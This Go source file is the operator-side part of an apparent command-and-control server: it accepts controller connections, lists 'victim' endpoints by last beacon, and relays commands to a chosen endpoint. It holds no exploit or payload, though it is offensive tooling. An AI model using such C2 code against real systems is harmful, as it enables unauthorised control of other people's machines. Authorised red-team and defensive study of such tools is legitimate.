package main

/*
 * handleController.go
 * Handle connections to human controllers
 * By J. Stuart McMurray
 * Created 20170518
 * Last Modified 20170518
 */

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"net/textproto"
	"strings"
	"text/tabwriter"
	"time"
)

/* handleControllers accepts controller connections and allows them to interact
with victims */
func handleControllers(l net.Listener) {
	for {
		c, err := l.Accept()
		if nil != err {
			log.Fatalf(
				"Unable to accept connection on %v: %v",
				l.Addr(),
				err,
			)
		}
		go handleController(c)
	}
}

/* handleController handles comms between a human controller and a victim */
func handleController(c net.Conn) {
	defer c.Close()
	/* Work out a remote address, or something like it */
	ra := c.RemoteAddr().String()
	if "" == ra {
		ra = fmt.Sprintf("unix-sock-%v", time.Now().UnixNano())
	}
	log.Printf("[C %v] Connected", ra)
	defer log.Printf("[C %v] Disconnected", ra)

	/* Line reader */
	r := textproto.NewReader(bufio.NewReader(c))

	/* TODO: List endpoints */
	/* Welcome user */
	var (
		endpoint string
		err      error
	)
	if _, err := fmt.Fprintf(c, "Welcome.  You are %v.\n", ra); nil != err {
		log.Printf("[C %v] Welcome error: %v", ra, err)
		return
	}

TOP:
	if _, err := fmt.Fprintf(
		c,
		"Which endpoint would you like to control?\n"+
			"Enter an endpoint path or ? to list endpoints.\n"+
			"> ",
	); nil != err {
		log.Printf(
			"[C %v] Endpoint selection prompt error: %v",
			ra,
			err,
		)
		return
	}
	/* Prompt for the endpoint */
	endpoint, err = r.ReadLine()
	if nil != err {
		log.Printf("[C %v] Endpoint selection error: %v", ra, err)
		return
	}
	/* Print the endpoints if we're asked */
	if "?" == endpoint {
		printEndpoints(c)
		fmt.Fprintf(c, "\n")
		goto TOP
	}

	/* Make sure it starts with a / */
	if !strings.HasPrefix(endpoint, "/") {
		endpoint = "/" + endpoint
		fmt.Fprintf(c, "Assuming you mean %v\n", endpoint)
	}

	/* Register the controller */
	tx, rx := ControlEndpoint(endpoint)
	defer RemoveRX(endpoint, rx)

	/* Proxy data from endpoint to controller */
	go func() {
		for o := range rx {
			c.Write(o)
		}
	}()

	/* Accept commands, send to the endpoint */
	var line string
	for {
		/* Write a prompt */
		fmt.Fprintf(c, "%v> ", endpoint)

		/* Read a command */
		line, err = r.ReadLine()
		if nil != err {
			if io.EOF != err {
				log.Printf(
					"[C %v] Controller read error: %v",
					ra,
					err,
				)
			}
			return
		}
		/* Ignore blank lines */
		if "" == line {
			continue
		}
		/* Send it to the endpoint */
		tx <- line
	}
}

/* printEndpoints lists all the known endpoints to c */
func printEndpoints(c io.Writer) error {
	w := tabwriter.NewWriter(c, 2, 0, 4, ' ', 0)
	fmt.Fprintf(w, "Endpoint\tLast beacon\n")
	fmt.Fprintf(w, "--------\t-----------\n")
	for _, e := range ListEndpoints() {
		if _, err := fmt.Fprintf(
			w,
			"%v\t%v\n",
			e.Name,
			e.LastBeacon,
		); nil != err {
			return err
		}
	}
	return w.Flush()
}
